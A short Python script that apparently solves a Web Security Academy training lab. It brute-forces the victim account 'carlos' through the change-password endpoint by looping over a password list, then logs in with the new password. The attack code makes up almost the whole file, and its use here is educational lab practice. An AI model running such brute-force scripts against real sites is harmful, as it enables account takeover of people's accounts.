from listgen import *
import requests
import argparse


parser = argparse.ArgumentParser(description='Solves the following Lab: Password brute-force via password change')
parser.add_argument('--id', action='store', help='lab ID, ex: 0a6e00ec03ca2e848083672100ee00fb', required=True)
lab = parser.parse_args()


for password in passlist():

    r = requests.post("https://" + lab.id + ".web-security-academy.net/login", data={"username":"wiener","password":"peter"}, allow_redirects=False)

    headers = {"Cookie":f"session={r.cookies.get('session')}"}
    data = {"username":"carlos","current-password":f"{password}","new-password-1":"bruteforce","new-password-2":"bruteforce"}

    r = requests.post("https://" + lab.id + ".web-security-academy.net/my-account/change-password", headers=headers, data=data)

r = requests.post("https://" + lab.id + ".web-security-academy.net/login", data={"username":"carlos","password":"bruteforce"})
headers = {"Cookie":f"session={r.cookies.get('session')}"}
r = requests.get("https://" + lab.id + ".web-security-academy.net/my-account")

try:
    assert('<p>Solved</p>' in requests.get("https://" + lab.id + ".web-security-academy.net/").text)
    print('Lab solved.')
except Exception:
    print("Error while trying to solve the lab, try to login manually: carlos:bruteforce")